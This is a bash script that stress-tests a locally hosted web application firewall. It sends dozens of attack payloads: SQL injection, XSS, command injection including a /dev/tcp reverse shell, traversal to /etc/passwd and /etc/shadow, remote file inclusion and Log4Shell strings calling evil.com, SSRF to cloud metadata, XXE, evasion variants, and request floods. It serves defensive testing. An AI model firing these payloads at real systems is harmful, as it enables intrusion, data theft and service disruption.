#!/usr/bin/env bash
# =====================================================================
#  Shibuya WAF — MEGA STRESS TEST 🔥🔥🔥
# =====================================================================
#  Phase 1: 30 Attack Vectors (SQLi, XSS, CMDi, LFI, RFI, XXE, etc.)
#  Phase 2: Concurrent Load Bombardment (parallel requests)
#  Phase 3: Evasion Techniques (encoding, obfuscation)
#  Phase 4: Rate Limit Hammering (burst flood)
#  Phase 5: Legitimate Traffic Baseline
# =====================================================================

set -uo pipefail

WAF_URL="${WAF_URL:-http://localhost:8080}"
CONCURRENCY=20
TOTAL=0
BLOCK=0
PASS=0
RESULTS=()
PHASE_RESULTS=()

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
PURPLE='\033[0;35m'
WHITE='\033[1;37m'
NC='\033[0m'
BOLD='\033[1m'
DIM='\033[2m'

fire() {
    local category="$1"
    local name="$2"
    shift 2

    TOTAL=$((TOTAL + 1))
    
    # Capture HTTP code, handle curl timeout gracefully
    local raw_code
    raw_code=$(curl --globoff -s -o /dev/null -w "%{http_code}" --max-time 5 "$@" 2>/dev/null) || true
    # Strip any non-numeric characters and take first 3 digits
    HTTP_CODE=$(echo "$raw_code" | grep -oE '^[0-9]{3}' | head -1)
    HTTP_CODE="${HTTP_CODE:-000}"
    
    if [[ "$HTTP_CODE" == "403" || "$HTTP_CODE" == "406" || "$HTTP_CODE" == "429" || "$HTTP_CODE" == "000" || "$HTTP_CODE" == "400" ]]; then
        BLOCK=$((BLOCK + 1))
        RESULTS+=("${GREEN}✅${NC} #${TOTAL} [${category}] ${name} → HTTP ${HTTP_CODE}")
        printf "  ${CYAN}%-3s${NC} ${PURPLE}%-20s${NC} %-45s ${GREEN}BLOCKED ✅${NC} (${HTTP_CODE})\n" "#${TOTAL}" "[${category}]" "${name}"
    else
        PASS=$((PASS + 1))
        RESULTS+=("${RED}❌${NC} #${TOTAL} [${category}] ${name} → HTTP ${HTTP_CODE}")
        printf "  ${CYAN}%-3s${NC} ${PURPLE}%-20s${NC} %-45s ${RED}PASSED  ❌${NC} (${HTTP_CODE})\n" "#${TOTAL}" "[${category}]" "${name}"
    fi
    
    sleep 0.1
}

phase_summary() {
    local phase_name="$1"
    local phase_block="$2"
    local phase_total="$3"
    local rate=$((phase_block * 100 / (phase_total > 0 ? phase_total : 1)))
    echo ""
    if [[ $rate -ge 80 ]]; then
        echo -e "  ${GREEN}⬤ ${phase_name}: ${phase_block}/${phase_total} blocked (${rate}%)${NC}"
    elif [[ $rate -ge 50 ]]; then
        echo -e "  ${YELLOW}⬤ ${phase_name}: ${phase_block}/${phase_total} blocked (${rate}%)${NC}"
    else
        echo -e "  ${RED}⬤ ${phase_name}: ${phase_block}/${phase_total} blocked (${rate}%)${NC}"
    fi
}

banner() {
    echo ""
    echo -e "${BOLD}${WHITE}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BOLD}${WHITE}║  🔥🔥🔥  SHIBUYA WAF — MEGA STRESS TEST  🔥🔥🔥                   ║${NC}"
    echo -e "${BOLD}${WHITE}║  Target: ${WAF_URL}                                         ║${NC}"
    echo -e "${BOLD}${WHITE}║  $(date '+%Y-%m-%d %H:%M:%S')                                              ║${NC}"
    echo -e "${BOLD}${WHITE}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

# ═══════════════════════════════════════════════════════════════
banner

# Pre-flight
echo -e "${YELLOW}▸ Pre-flight checks...${NC}"
PREFLIGHT=$(curl --globoff -s -o /dev/null -w "%{http_code}" --max-time 3 "${WAF_URL}/health" 2>/dev/null || echo "000")
if [[ "$PREFLIGHT" == "000" ]]; then
    echo -e "${RED}✗ WAF is not responding on ${WAF_URL}. Start the WAF first!${NC}"
    exit 1
fi
echo -e "${GREEN}✓ WAF responding (HTTP ${PREFLIGHT})${NC}"
echo ""

# ═══════════════════════════════════════════════════════════════
# PHASE 1: CORE ATTACK VECTORS (30+ attacks)
# ═══════════════════════════════════════════════════════════════
echo -e "${BOLD}${WHITE}══════════════════════════════════════════════════════════════${NC}"
echo -e "${BOLD}${WHITE}  PHASE 1: CORE ATTACK VECTORS${NC}"
echo -e "${BOLD}${WHITE}══════════════════════════════════════════════════════════════${NC}"
echo ""
P1_START_BLOCK=$BLOCK

# --- SQL INJECTION ---
echo -e "${BOLD}━━━ SQL Injection (8 vectors) ━━━${NC}"

fire "SQLi" "Classic OR 1=1" \
    "${WAF_URL}/user/1%27%20OR%201%3D1%20--"

fire "SQLi" "UNION SELECT" \
    "${WAF_URL}/user/1%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--"

fire "SQLi" "Blind Boolean SQLi" \
    "${WAF_URL}/user/1%27%20AND%201%3D1%20AND%20%27a%27%3D%27a"

fire "SQLi" "Time-Based Blind (SLEEP)" \
    "${WAF_URL}/user/1%27%3BSELECT%20SLEEP%285%29--"

fire "SQLi" "Stacked Queries" \
    "${WAF_URL}/user/1%27%3BDROP%20TABLE%20users--"

fire "SQLi" "CONCAT extraction" \
    "${WAF_URL}/user/1%27%20UNION%20SELECT%20CONCAT%28user%2C0x3a%2Cpassword%29%20FROM%20mysql.user--"

fire "SQLi" "Hex-encoded injection" \
    "${WAF_URL}/user/1%20OR%200x31%3D0x31"

fire "SQLi" "POST Login SQLi" \
    -X POST "${WAF_URL}/login" \
    -H "Content-Type: application/json" \
    -d '{"user":"admin'\'' OR 1=1--","pass":"anything"}'

echo ""

# --- XSS ---
echo -e "${BOLD}━━━ Cross-Site Scripting — XSS (8 vectors) ━━━${NC}"

fire "XSS" "Reflected <script>" \
    "${WAF_URL}/search?q=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E"

fire "XSS" "IMG onerror" \
    "${WAF_URL}/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E"

fire "XSS" "SVG onload" \
    "${WAF_URL}/search?q=%3Csvg%2Fonload%3Dalert%28%27xss%27%29%3E"

fire "XSS" "Event handler (body onload)" \
    "${WAF_URL}/search?q=%3Cbody%20onload%3Dalert%28document.cookie%29%3E"

fire "XSS" "JavaScript URI" \
    "${WAF_URL}/search?q=%3Ca%20href%3D%22javascript%3Aalert%281%29%22%3Eclick%3C%2Fa%3E"

fire "XSS" "Data URI base64" \
    "${WAF_URL}/search?q=%3Cobject%20data%3D%22data%3Atext%2Fhtml%3Bbase64%2CPHN2ZyBvbmxvYWQ9YWxlcnQoMSk%2B%22%3E"

fire "XSS" "Attribute injection" \
    "${WAF_URL}/search?q=x%22%20onfocus%3Dalert%281%29%20autofocus%3D%22"

fire "XSS" "Template literal injection" \
    "${WAF_URL}/search?q=%24%7Balert%28document.domain%29%7D"

echo ""

# --- COMMAND INJECTION ---
echo -e "${BOLD}━━━ Command Injection (5 vectors) ━━━${NC}"

fire "CMDi" "Semicolon ls" \
    "${WAF_URL}/search?q=test%3Bls%20-la%20%2Fetc"

fire "CMDi" "Pipe cat passwd" \
    "${WAF_URL}/search?q=test%7Ccat%20%2Fetc%2Fpasswd"

fire "CMDi" "Backtick exec" \
    "${WAF_URL}/search?q=%60id%60"

fire "CMDi" "$(command) form" \
    "${WAF_URL}/search?q=%24%28cat%20%2Fetc%2Fpasswd%29"

fire "CMDi" "Reverse shell" \
    "${WAF_URL}/search?q=%3Bbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.1%2F4444%200%3E%261"

echo ""

# --- PATH TRAVERSAL ---
echo -e "${BOLD}━━━ Path Traversal (4 vectors) ━━━${NC}"

fire "Traversal" "Classic ../../../etc/passwd" \
    "${WAF_URL}/file?name=../../../../../../etc/passwd"

fire "Traversal" "Null byte injection" \
    "${WAF_URL}/file?name=../../etc/passwd%00.jpg"

fire "Traversal" "Double encoding" \
    "${WAF_URL}/file?name=..%252f..%252f..%252fetc%252fpasswd"

fire "Traversal" "UTF-8 encoding" \
    "${WAF_URL}/file?name=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"

echo ""

# --- LFI/RFI ---
echo -e "${BOLD}━━━ LFI / RFI (4 vectors) ━━━${NC}"

fire "LFI" "/etc/shadow" \
    "${WAF_URL}/file?name=../../../../etc/shadow"

fire "LFI" "PHP filter wrapper" \
    "${WAF_URL}/file?name=php://filter/convert.base64-encode/resource=/etc/passwd"

fire "RFI" "External shell.php" \
    "${WAF_URL}/file?name=http%3A%2F%2Fevil.com%2Fshell.php"

fire "RFI" "Data URI payload" \
    "${WAF_URL}/file?name=data%3A%2F%2Ftext%2Fplain%3Bbase64%2CPD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8%2B"

echo ""

# --- SSRF ---
echo -e "${BOLD}━━━ SSRF (4 vectors) ━━━${NC}"

fire "SSRF" "AWS metadata endpoint" \
    "${WAF_URL}/redirect?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F"

fire "SSRF" "Internal service probe" \
    "${WAF_URL}/redirect?url=http%3A%2F%2F127.0.0.1%3A22"

fire "SSRF" "GCP metadata" \
    "${WAF_URL}/redirect?url=http%3A%2F%2Fmetadata.google.internal%2FcomputeMetadata%2Fv1%2F"

fire "SSRF" "Kubernetes API" \
    "${WAF_URL}/redirect?url=https%3A%2F%2Fkubernetes.default.svc%2Fapi"

echo ""

# --- XXE ---
echo -e "${BOLD}━━━ XXE (3 vectors) ━━━${NC}"

fire "XXE" "External entity /etc/passwd" \
    -X POST "${WAF_URL}/xml" \
    -H "Content-Type: application/xml" \
    -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'

fire "XXE" "Billion laughs DoS" \
    -X POST "${WAF_URL}/xml" \
    -H "Content-Type: application/xml" \
    -d '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><root>&lol2;</root>'

fire "XXE" "External DTD loading" \
    -X POST "${WAF_URL}/xml" \
    -H "Content-Type: application/xml" \
    -d '<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://evil.com/xxe.dtd"><root>test</root>'

echo ""

# --- LOG4SHELL ---
echo -e "${BOLD}━━━ Log4Shell / JNDI (3 vectors) ━━━${NC}"

fire "Log4Shell" "JNDI LDAP in header" \
    -H 'X-Api-Version: ${jndi:ldap://evil.com/exploit}' \
    "${WAF_URL}/"

fire "Log4Shell" "JNDI in User-Agent" \
    -H 'User-Agent: ${jndi:rmi://evil.com:1099/exploit}' \
    "${WAF_URL}/search?q=test"

fire "Log4Shell" "JNDI nested bypass" \
    -H 'X-Forwarded-For: ${${lower:j}ndi:${lower:l}dap://evil.com/x}' \
    "${WAF_URL}/"

echo ""

# --- HEADER INJECTION ---
echo -e "${BOLD}━━━ Header Injection / Shellshock (3 vectors) ━━━${NC}"

fire "Header" "Shellshock User-Agent" \
    -H 'User-Agent: () { :; }; /bin/bash -c "cat /etc/passwd"' \
    "${WAF_URL}/"

fire "Header" "Host header attack" \
    -H "Host: evil.com" \
    -H "X-Forwarded-Host: evil.com" \
    "${WAF_URL}/admin"

fire "Header" "CRLF injection" \
    "${WAF_URL}/search?q=test%0d%0aSet-Cookie:%20session=hijacked"

echo ""

# --- SCANNER FINGERPRINTS ---
echo -e "${BOLD}━━━ Scanner Detection (4 vectors) ━━━${NC}"

fire "Scanner" "Nikto user agent" \
    -H "User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:map_codes)" \
    "${WAF_URL}/"

fire "Scanner" "SQLMap user agent" \
    -H "User-Agent: sqlmap/1.7.2#stable (https://sqlmap.org)" \
    "${WAF_URL}/user/1"

fire "Scanner" "Nmap script scan" \
    -H "User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" \
    "${WAF_URL}/"

fire "Scanner" "DirBuster" \
    -H "User-Agent: DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)" \
    "${WAF_URL}/admin"

echo ""

# --- PROTOCOL ABUSE ---
echo -e "${BOLD}━━━ Protocol Abuse (2 vectors) ━━━${NC}"

fire "Protocol" "HTTP Request Smuggling" \
    -X POST "${WAF_URL}/" \
    -H "Transfer-Encoding: chunked" \
    -d $'0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n'

fire "Protocol" "Oversized Cookie" \
    -H "Cookie: session=$(python3 -c 'print("A"*8000)')" \
    "${WAF_URL}/"

echo ""

P1_END_BLOCK=$BLOCK
P1_ATTACKS=$((TOTAL))
P1_BLOCKED=$((P1_END_BLOCK - P1_START_BLOCK))

phase_summary "Phase 1: Attack Vectors" "$P1_BLOCKED" "$P1_ATTACKS"

# ═══════════════════════════════════════════════════════════════
# PHASE 2: EVASION TECHNIQUES
# ═══════════════════════════════════════════════════════════════
echo ""
echo -e "${BOLD}${WHITE}══════════════════════════════════════════════════════════════${NC}"
echo -e "${BOLD}${WHITE}  PHASE 2: EVASION TECHNIQUES${NC}"
echo -e "${BOLD}${WHITE}══════════════════════════════════════════════════════════════${NC}"
echo ""
P2_START=$TOTAL
P2_START_BLOCK=$BLOCK

echo -e "${BOLD}━━━ WAF Bypass / Evasion (10 vectors) ━━━${NC}"

fire "Evasion" "Mixed case SQLi" \
    "${WAF_URL}/user/1%27%20oR%201%3D1%20--"

fire "Evasion" "Comment-obfuscated SQLi" \
    "${WAF_URL}/user/1%27%20/**/UNION/**/SELECT/**/1--"

fire "Evasion" "Tab-separated SQLi" \
    "${WAF_URL}/user/1%27%09OR%091%3D1--"

fire "Evasion" "No-space SQLi (parens)" \
    "${WAF_URL}/user/1%27OR(1)%3D(1)--"

fire "Evasion" "Double URL encode XSS" \
    "${WAF_URL}/search?q=%253Cscript%253Ealert(1)%253C/script%253E"

fire "Evasion" "Unicode XSS bypass" \
    "${WAF_URL}/search?q=%EF%BC%9Cscript%EF%BC%9Ealert(1)%EF%BC%9C%EF%BC%8Fscript%EF%BC%9E"

fire "Evasion" "Null byte XSS bypass" \
    "${WAF_URL}/search?q=%3Cscr%00ipt%3Ealert(1)%3C/scr%00ipt%3E"

fire "Evasion" "Chunked POST SQLi" \
    -X POST "${WAF_URL}/login" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Transfer-Encoding: chunked" \
    -d "user=admin'%20OR%201=1--&pass=x"

fire "Evasion" "JSON SQLi in body" \
    -X POST "${WAF_URL}/api/data" \
    -H "Content-Type: application/json" \
    -d '{"query":"1 UNION SELECT * FROM users","filter":"1=1"}'

fire "Evasion" "Multiline XSS payload" \
    "${WAF_URL}/search?q=%3Csvg%0Aonload%0A%3D%0Aalert%0A(1)%3E"

echo ""

P2_END=$TOTAL
P2_END_BLOCK=$BLOCK
P2_BLOCKED=$((P2_END_BLOCK - P2_START_BLOCK))
P2_TOTAL=$((P2_END - P2_START))

phase_summary "Phase 2: Evasion Techniques" "$P2_BLOCKED" "$P2_TOTAL"

# ═══════════════════════════════════════════════════════════════
# PHASE 3: CONCURRENT LOAD BOMBARDMENT
# ═══════════════════════════════════════════════════════════════
echo ""
echo -e "${BOLD}${WHITE}══════════════════════════════════════════════════════════════${NC}"
echo -e "${BOLD}${WHITE}  PHASE 3: CONCURRENT LOAD BOMBARDMENT (${CONCURRENCY} parallel)${NC}"
echo -e "${BOLD}${WHITE}══════════════════════════════════════════════════════════════${NC}"
echo ""

P3_START=$TOTAL
P3_START_BLOCK=$BLOCK

# Attack payloads array for concurrent bombardment
ATTACK_URLS=(
    "${WAF_URL}/user/1%27%20OR%201%3D1--"
    "${WAF_URL}/search?q=%3Cscript%3Ealert(1)%3C/script%3E"
    "${WAF_URL}/file?name=../../etc/passwd"
    "${WAF_URL}/redirect?url=http%3A%2F%2F169.254.169.254%2F"
    "${WAF_URL}/search?q=%60id%60"
    "${WAF_URL}/user/1%20UNION%20SELECT%20*--"
    "${WAF_URL}/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"
    "${WAF_URL}/file?name=../../etc/shadow"
    "${WAF_URL}/search?q=test%3Bls%20-la"
    "${WAF_URL}/admin"
)

echo -e "  ${YELLOW}▸ Launching ${CONCURRENCY} parallel attack waves (100 total requests)...${NC}"
echo ""

CONCURRENT_BLOCKED=0
CONCURRENT_TOTAL=0

for wave in $(seq 1 5); do
    echo -ne "  ${CYAN}Wave ${wave}/5:${NC} "
    WAVE_BLOCKED=0
    WAVE_TOTAL=0
    
    # Launch concurrent requests
    PIDS=()
    TMPDIR_WAVE=$(mktemp -d)
    
    for i in $(seq 1 $CONCURRENCY); do
        URL_IDX=$(( (i - 1) % ${#ATTACK_URLS[@]} ))
        (
            CODE=$(curl --globoff -s -o /dev/null -w "%{http_code}" --max-time 5 "${ATTACK_URLS[$URL_IDX]}" 2>/dev/null || echo "000")
            echo "$CODE" > "${TMPDIR_WAVE}/result_${i}.txt"
        ) &
        PIDS+=($!)
    done
    
    # Wait for all
    for pid in "${PIDS[@]}"; do
        wait "$pid" 2>/dev/null || true
    done
    
    # Count results
    for f in "${TMPDIR_WAVE}"/result_*.txt; do
        if [[ -f "$f" ]]; then
            CODE=$(cat "$f")
            WAVE_TOTAL=$((WAVE_TOTAL + 1))
            if [[ "$CODE" == "403" || "$CODE" == "406" || "$CODE" == "429" || "$CODE" == "000" || "$CODE" == "400" ]]; then
                WAVE_BLOCKED=$((WAVE_BLOCKED + 1))
            fi
        fi
    done
    
    rm -rf "$TMPDIR_WAVE"
    
    CONCURRENT_BLOCKED=$((CONCURRENT_BLOCKED + WAVE_BLOCKED))
    CONCURRENT_TOTAL=$((CONCURRENT_TOTAL + WAVE_TOTAL))
    
    WAVE_RATE=$((WAVE_BLOCKED * 100 / (WAVE_TOTAL > 0 ? WAVE_TOTAL : 1) ))
    if [[ $WAVE_RATE -ge 80 ]]; then
        echo -e "${GREEN}${WAVE_BLOCKED}/${WAVE_TOTAL} blocked (${WAVE_RATE}%) ✅${NC}"
    elif [[ $WAVE_RATE -ge 50 ]]; then
        echo -e "${YELLOW}${WAVE_BLOCKED}/${WAVE_TOTAL} blocked (${WAVE_RATE}%) ⚠️${NC}"
    else
        echo -e "${RED}${WAVE_BLOCKED}/${WAVE_TOTAL} blocked (${WAVE_RATE}%) ❌${NC}"
    fi
    
    sleep 0.5
done

# Add concurrent results to totals
TOTAL=$((TOTAL + CONCURRENT_TOTAL))
BLOCK=$((BLOCK + CONCURRENT_BLOCKED))

phase_summary "Phase 3: Concurrent Bombardment" "$CONCURRENT_BLOCKED" "$CONCURRENT_TOTAL"

# ═══════════════════════════════════════════════════════════════
# PHASE 4: RATE LIMIT HAMMERING
# ═══════════════════════════════════════════════════════════════
echo ""
echo -e "${BOLD}${WHITE}══════════════════════════════════════════════════════════════${NC}"
echo -e "${BOLD}${WHITE}  PHASE 4: RATE LIMIT HAMMERING${NC}"
echo -e "${BOLD}${WHITE}══════════════════════════════════════════════════════════════${NC}"
echo ""

P4_START=$TOTAL
P4_RATE_BLOCKED=0
P4_RATE_TOTAL=0

# Burst 1: 50 rapid requests
echo -ne "  ${CYAN}Burst 1:${NC} Hammering 50 requests (no delay)... "
for i in $(seq 1 50); do
    CODE=$(curl --globoff -s -o /dev/null -w "%{http_code}" --max-time 2 "${WAF_URL}/search?q=flood_burst1_${i}" 2>/dev/null || echo "000")
    P4_RATE_TOTAL=$((P4_RATE_TOTAL + 1))
    if [[ "$CODE" == "429" || "$CODE" == "403" || "$CODE" == "000" ]]; then
        P4_RATE_BLOCKED=$((P4_RATE_BLOCKED + 1))
    fi
done
echo -e "${YELLOW}${P4_RATE_BLOCKED}/${P4_RATE_TOTAL} throttled${NC}"

sleep 1

# Burst 2: 50 more rapid requests from "different path"
P4_BURST2_BLOCKED=0
echo -ne "  ${CYAN}Burst 2:${NC} Hammering 50 more requests (mixed endpoints)... "
for i in $(seq 1 50); do
    ENDPOINTS=("/search?q=scan_${i}" "/user/${i}" "/file?name=test${i}.txt" "/health" "/api/data")
    EP_IDX=$(( (i - 1) % 5 ))
    CODE=$(curl --globoff -s -o /dev/null -w "%{http_code}" --max-time 2 "${WAF_URL}${ENDPOINTS[$EP_IDX]}" 2>/dev/null || echo "000")
    P4_RATE_TOTAL=$((P4_RATE_TOTAL + 1))
    if [[ "$CODE" == "429" || "$CODE" == "403" || "$CODE" == "000" ]]; then
        P4_RATE_BLOCKED=$((P4_RATE_BLOCKED + 1))
        P4_BURST2_BLOCKED=$((P4_BURST2_BLOCKED + 1))
    fi
done
echo -e "${YELLOW}${P4_BURST2_BLOCKED}/50 throttled${NC}"

sleep 1

# Burst 3: Concurrent flood
P4_BURST3_BLOCKED=0
echo -ne "  ${CYAN}Burst 3:${NC} Parallel flood (50 concurrent)... "
TMPDIR_RATE=$(mktemp -d)
PIDS=()
for i in $(seq 1 50); do
    (
        CODE=$(curl --globoff -s -o /dev/null -w "%{http_code}" --max-time 2 "${WAF_URL}/search?q=concurrent_flood_${i}" 2>/dev/null || echo "000")
        echo "$CODE" > "${TMPDIR_RATE}/rate_${i}.txt"
    ) &
    PIDS+=($!)
done

for pid in "${PIDS[@]}"; do
    wait "$pid" 2>/dev/null || true
done

for f in "${TMPDIR_RATE}"/rate_*.txt; do
    if [[ -f "$f" ]]; then
        CODE=$(cat "$f")
        P4_RATE_TOTAL=$((P4_RATE_TOTAL + 1))
        if [[ "$CODE" == "429" || "$CODE" == "403" || "$CODE" == "000" ]]; then
            P4_RATE_BLOCKED=$((P4_RATE_BLOCKED + 1))
            P4_BURST3_BLOCKED=$((P4_BURST3_BLOCKED + 1))
        fi
    fi
done
rm -rf "$TMPDIR_RATE"
echo -e "${YELLOW}${P4_BURST3_BLOCKED}/50 throttled${NC}"

TOTAL=$((TOTAL + P4_RATE_TOTAL))
BLOCK=$((BLOCK + P4_RATE_BLOCKED))

phase_summary "Phase 4: Rate Limit Hammering" "$P4_RATE_BLOCKED" "$P4_RATE_TOTAL"

# ═══════════════════════════════════════════════════════════════
# PHASE 5: LEGITIMATE TRAFFIC BASELINE
# ═══════════════════════════════════════════════════════════════
echo ""
echo -e "${BOLD}${WHITE}══════════════════════════════════════════════════════════════${NC}"
echo -e "${BOLD}${WHITE}  PHASE 5: LEGITIMATE TRAFFIC BASELINE${NC}"
echo -e "${BOLD}${WHITE}══════════════════════════════════════════════════════════════${NC}"
echo ""

# Wait for rate-limit ban to expire (ban_duration_secs=60)
echo -e "  ${YELLOW}▸ Waiting 65s for rate-limit bans to expire...${NC}"
sleep 65

# Start a simple backend server (port 3000) for benign requests to proxy through
python3 -m http.server 3000 --directory /tmp &>/dev/null &
BACKEND_PID=$!
trap "kill $BACKEND_PID 2>/dev/null" EXIT
sleep 1

P5_LEGIT_PASS=0
P5_LEGIT_BLOCK=0
P5_LEGIT_TOTAL=20

echo -e "  ${YELLOW}▸ Sending 20 legitimate requests (should all PASS)...${NC}"
echo ""

LEGIT_REQUESTS=(
    "GET|${WAF_URL}/|Home page"
    "GET|${WAF_URL}/health|Health check"
    "GET|${WAF_URL}/user/1|Get user 1"
    "GET|${WAF_URL}/user/42|Get user 42"
    "GET|${WAF_URL}/admin|Admin page"
    "GET|${WAF_URL}/user/100|Get user 100"
    "GET|${WAF_URL}/health|Health check 2"
    "GET|${WAF_URL}/|Home page 2"
    "GET|${WAF_URL}/user/5|Get user 5"
    "GET|${WAF_URL}/health|Health check 3"
    "GET|${WAF_URL}/user/77|Get user 77"
    "GET|${WAF_URL}/|Home page 3"
    "GET|${WAF_URL}/user/200|Get user 200"
    "GET|${WAF_URL}/health|Health check 4"
    "GET|${WAF_URL}/user/99|Get user 99"
    "GET|${WAF_URL}/admin|Admin page 2"
    "GET|${WAF_URL}/user/3|Get user 3"
    "POST|${WAF_URL}/user/10|Update user 10"
    "GET|${WAF_URL}/user/15|Get user 15"
    "GET|${WAF_URL}/|Home page 4"
)

for entry in "${LEGIT_REQUESTS[@]}"; do
    IFS='|' read -r METHOD URL NAME <<< "$entry"
    
    if [[ "$METHOD" == "POST" && "$URL" == *"/login"* ]]; then
        CODE=$(curl --globoff -s -o /dev/null -w "%{http_code}" --max-time 5 -X POST "$URL" \
            -H "Content-Type: application/json" \
            -d '{"user":"testuser","pass":"validpass123"}' 2>/dev/null || echo "000")
    elif [[ "$METHOD" == "POST" ]]; then
        CODE=$(curl --globoff -s -o /dev/null -w "%{http_code}" --max-time 5 -X POST "$URL" \
            -H "Content-Type: application/json" \
            -d '{"key":"value","data":"normal data"}' 2>/dev/null || echo "000")
    else
        CODE=$(curl --globoff -s -o /dev/null -w "%{http_code}" --max-time 5 "$URL" 2>/dev/null || echo "000")
    fi
    
    TOTAL=$((TOTAL + 1))
    
    if [[ "$CODE" == "200" || "$CODE" == "301" || "$CODE" == "302" || "$CODE" == "404" ]]; then
        P5_LEGIT_PASS=$((P5_LEGIT_PASS + 1))
        printf "  ${GREEN}✅${NC} %-35s → HTTP ${CODE} (allowed)\n" "${NAME}"
    else
        P5_LEGIT_BLOCK=$((P5_LEGIT_BLOCK + 1))
        BLOCK=$((BLOCK + 1))
        printf "  ${RED}⚠️${NC}  %-35s → HTTP ${CODE} (false positive!)\n" "${NAME}"
    fi
    
    sleep 0.2
done

echo ""
FP_RATE=$((P5_LEGIT_BLOCK * 100 / P5_LEGIT_TOTAL))
if [[ $FP_RATE -eq 0 ]]; then
    echo -e "  ${GREEN}⬤ Phase 5: 0 false positives! (${P5_LEGIT_PASS}/${P5_LEGIT_TOTAL} allowed)${NC}"
elif [[ $FP_RATE -le 10 ]]; then
    echo -e "  ${YELLOW}⬤ Phase 5: ${P5_LEGIT_BLOCK} false positive(s) (${FP_RATE}%)${NC}"
else
    echo -e "  ${RED}⬤ Phase 5: ${P5_LEGIT_BLOCK} false positives (${FP_RATE}%) — TOO HIGH${NC}"
fi

# ═══════════════════════════════════════════════════════════════
#  MEGA FINAL REPORT
# ═══════════════════════════════════════════════════════════════
echo ""
echo ""

TOTAL_ATTACKS=$((TOTAL - P5_LEGIT_TOTAL))
ATTACK_BLOCK_RATE=$((BLOCK * 100 / (TOTAL_ATTACKS > 0 ? TOTAL_ATTACKS : 1)))
OVERALL_RATE=$((BLOCK * 100 / (TOTAL > 0 ? TOTAL : 1)))

echo -e "${BOLD}${WHITE}╔══════════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BOLD}${WHITE}║              📊  MEGA STRESS TEST — FINAL REPORT  📊               ║${NC}"
echo -e "${BOLD}${WHITE}╠══════════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${BOLD}${WHITE}║${NC}  ${BOLD}Total Requests Sent:${NC}    ${YELLOW}${TOTAL}${NC}"
echo -e "${BOLD}${WHITE}║${NC}  ${BOLD}Malicious Requests:${NC}     ${RED}${TOTAL_ATTACKS}${NC}"
echo -e "${BOLD}${WHITE}║${NC}  ${BOLD}Legitimate Requests:${NC}    ${GREEN}${P5_LEGIT_TOTAL}${NC}"
echo -e "${BOLD}${WHITE}║${NC}"
echo -e "${BOLD}${WHITE}║${NC}  ${BOLD}Attacks Blocked:${NC}        ${GREEN}${BLOCK}${NC}  ✅"
echo -e "${BOLD}${WHITE}║${NC}  ${BOLD}Attacks Passed:${NC}         ${RED}${PASS}${NC}  ❌"
echo -e "${BOLD}${WHITE}║${NC}  ${BOLD}False Positives:${NC}        ${YELLOW}${P5_LEGIT_BLOCK}${NC}"
echo -e "${BOLD}${WHITE}║${NC}"
echo -e "${BOLD}${WHITE}║${NC}  ${BOLD}Attack Block Rate:${NC}      ${YELLOW}${ATTACK_BLOCK_RATE}%${NC}"
echo -e "${BOLD}${WHITE}║${NC}  ${BOLD}False Positive Rate:${NC}    ${YELLOW}${FP_RATE}%${NC}"
echo -e "${BOLD}${WHITE}╠══════════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${BOLD}${WHITE}║${NC}  ${DIM}Phase Breakdown:${NC}"
phase_summary "  Phase 1: Core Attacks" "$P1_BLOCKED" "$P1_ATTACKS"
phase_summary "  Phase 2: Evasion" "$P2_BLOCKED" "$P2_TOTAL"
phase_summary "  Phase 3: Concurrent" "$CONCURRENT_BLOCKED" "$CONCURRENT_TOTAL"
phase_summary "  Phase 4: Rate Limit" "$P4_RATE_BLOCKED" "$P4_RATE_TOTAL"
echo ""
if [[ $FP_RATE -eq 0 ]]; then
    echo -e "  ${GREEN}⬤ Legitimate Traffic: 0% false positive rate${NC}"
else
    echo -e "  ${YELLOW}⬤ Legitimate Traffic: ${FP_RATE}% false positive rate${NC}"
fi
echo -e "${BOLD}${WHITE}╚══════════════════════════════════════════════════════════════════════╝${NC}"
echo ""

if [[ $ATTACK_BLOCK_RATE -ge 90 ]]; then
    echo -e "${GREEN}${BOLD}🛡️  OUTSTANDING: WAF blocked ${ATTACK_BLOCK_RATE}% of attacks with ${FP_RATE}% false positives!${NC}"
elif [[ $ATTACK_BLOCK_RATE -ge 80 ]]; then
    echo -e "${GREEN}${BOLD}🛡️  EXCELLENT: WAF blocked ${ATTACK_BLOCK_RATE}% of attacks!${NC}"
elif [[ $ATTACK_BLOCK_RATE -ge 60 ]]; then
    echo -e "${YELLOW}${BOLD}⚠️  DECENT: WAF blocked ${ATTACK_BLOCK_RATE}% — room for improvement.${NC}"
else
    echo -e "${RED}${BOLD}❌ POOR: WAF only blocked ${ATTACK_BLOCK_RATE}% — review CRS rules and config!${NC}"
fi
echo ""
echo -e "${DIM}Test completed at $(date '+%Y-%m-%d %H:%M:%S')${NC}"
echo -e "${BOLD}Open the dashboard at http://localhost:5173 to see live results! 🏯${NC}"
echo ""
